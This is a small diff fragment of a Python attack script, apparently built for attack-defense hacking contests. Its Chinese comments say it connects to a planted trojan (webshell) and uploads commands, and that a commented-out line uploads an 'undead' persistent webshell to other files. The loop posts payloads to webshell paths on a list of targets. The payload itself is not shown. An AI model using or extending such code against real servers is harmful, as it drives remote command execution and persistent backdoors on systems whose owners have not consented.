@@ -56,7 +56,7 @@ def shell():
             url1 = i + path1
             print(url1)
             response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令
-            # response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令(此项是用来上传其他文件下的不死马)
+            # response1 = requests.post(url1, data=xieru, headers=headers, timeout=1)  # 链接木马并上传命令(此项是用来上传其他文件下的不死马)
             url = i + path
             try:
                 resume()
